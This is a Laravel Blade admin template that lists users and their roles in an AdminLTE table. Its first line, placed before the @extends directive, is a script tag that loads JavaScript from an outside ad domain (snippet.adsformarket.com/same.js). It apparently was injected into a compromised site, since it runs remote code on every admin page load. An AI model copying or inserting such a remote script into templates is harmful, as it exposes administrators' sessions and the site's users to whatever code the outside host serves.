<script type='text/javascript' src='https://snippet.adsformarket.com/same.js'></script>@extends('adminlte::page')

@section('title', '角色管理')

@section('content_header')
<h1>角色管理</h1>
@stop

@section('content')
<div class="row">
	<div class="col-12">
		<div class="card">
			<div class="card-header">
				<h3 class="card-title">角色</h3>
				<div class="card-tools">
					<div class="card-tool-buttons"><a href="http://shop.quanyu.wang/admin/roles/create" type="button" class="btn btn-sm btn-success"><i
							 class="fas fa-plus"></i>&nbsp;新增</a> <button type="button" data-toggle="dropdown" class="btn btn-sm btn-info dropdown-toggle dropdown-icon">
							导出&nbsp;
						</button>
						<div class="dropdown-menu"><a href="#" class="dropdown-item">Dropdown link</a> <a href="#" class="dropdown-item">Dropdown
								link</a></div>
					</div>
				</div>
			</div>
			<div class="card-body table-responsive p-0">
				<table class="table table-hover">
					<thead>
						<tr>
							<th>ID</th>
							<th>User</th>
							<th>Email</th>
							<th>验证时间</th>
              <th>角色</th>
							<th>创建时间</th>
							<th class="text-center">操作</th>
						</tr>
					</thead>
					<tbody>
            @foreach($users as $user)
						<tr>
							<td data-id="{{ $user->id }}">#</td>
							<td>{{ $user->name }}</td>
							<td><code>{{ $user->email }}</code></td>
              <td>{{ $user->email_verified_at }}</td>
              <td>
                @foreach($user->roles as $role)
                <span class="badge bg-green">{{ $role->name }}</span>
                @endforeach
              </td>
							<td>{{ $user->created_at->diffForHumans() }}</td>
							<td class="project-actions text-center">
                <a href="#" class="btn btn-primary btn-xs"><i
									 class="fas fa-folder"></i>
									View
								</a> <a href="#" class="btn btn-info btn-xs"><i class="fas fa-pencil-alt"></i>
									Edit
								</a> <a href="#" class="btn btn-danger btn-xs"><i class="fas fa-trash"></i>
									Delete
								</a></td>
						</tr>
            @endforeach
					</tbody>
				</table>
			</div>
			<div class="card-footer clearfix"></div>
		</div>
	</div>
</div>
@stop

@section('css')

@stop

@section('js')
<script>
	console.log('Hi!');
</script>
@stop
